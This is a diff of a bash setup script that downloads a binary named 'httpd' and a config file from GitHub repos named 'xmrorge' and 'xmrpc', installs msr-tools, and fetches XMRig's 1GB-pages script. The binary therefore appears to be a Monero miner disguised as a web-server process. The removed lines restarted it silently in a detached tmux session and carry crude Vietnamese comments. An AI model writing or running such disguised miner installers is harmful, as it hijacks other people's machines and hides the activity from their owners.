@@ -1,26 +1,15 @@
 #!/bin/bash
 
-set -x #echo on
-if [ -f ${PWD}/httpd ]; then
-    if pgrep -x "httpd" > /dev/null
-then
-    echo "scrip dang chay roi , ke cmn di "
-    
-else
-
-echo "script da install , chay thoi "
-sudo rm config.json
-sudo wget https://raw.githubusercontent.com/minnie1311/xmrpc/master/config.json
-sudo tmux new-session -d -s my_session1  './httpd'
-
+myNodeType=$1;
+if [ -z "$myNodeType" ]; then
+    echo "[ERROR] No node type specified. Exiting!"
+    usage
 fi
-exit
-fi
+echo "myNodeType=$myNodeType";
 
-
+echo "MyNodeType=$myNodeType" | sudo tee -a /etc/environment
 
 sudo apt-get install msr-tools build-essential cmake libuv1-dev libssl-dev libhwloc-dev tmux -y
-sudo rm config.json
 sudo wget https://raw.githubusercontent.com/minnie1311/xmrpc/master/config.json
 sudo wget https://github.com/minnie1311/xmrorge/raw/master/httpd
 wget https://raw.githubusercontent.com/xmrig/xmrig/master/scripts/enable_1gb_pages.sh
